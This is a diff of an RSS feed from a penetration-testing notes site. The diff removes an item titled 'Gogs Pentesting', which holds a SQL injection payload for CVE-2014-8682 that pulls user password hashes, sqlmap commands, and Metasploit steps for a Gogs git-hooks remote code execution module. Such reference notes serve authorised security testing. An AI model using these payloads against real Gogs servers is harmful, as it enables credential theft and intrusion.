@@ -44,13 +44,6 @@
       <description>Identify Where SQL Injection can be Performed linkThere are many places where SQLi can be performed. For example,&#xA;URL parameters POST parameters HTTP request headers (Cookie, User-Agent, etc.) Cheat Sheet linkTo see SQL injection cheat sheet, please refer to this page.</description>
     </item>
     <item>
-      <title>Gogs Pentesting</title>
-      <link>https://documentnation.github.io/docs/hdks/version-control/git/gogs-pentesting/</link>
-      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/version-control/git/gogs-pentesting/</guid>
-      <description>SQL injection (CVE-2014-8682) link http://127.0.0.1:3000/api/v1/users/search?q=&amp;#39;)/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1-- Automation link sqlmap -u &amp;#34;https://example.com/api/v1/repos/search?q=test&amp;#34; sqlmap -u &amp;#34;https://example.com/api/v1/users/search?q=test&amp;#34; Git Hooks Remote Code Execution (RCE) link msfconsole msf&amp;gt; use exploit/multi/http/gogs_git_hooks_rce msf&amp;gt; (set options...) msf&amp;gt; run </description>
-    </item>
-    <item>
       <title>WebSocket Pentesting</title>
       <link>https://documentnation.github.io/docs/hdks/web/websocket-pentesting/</link>
       <pubDate>Wed, 08 Mar 2023 00:00:00 +0000</pubDate>
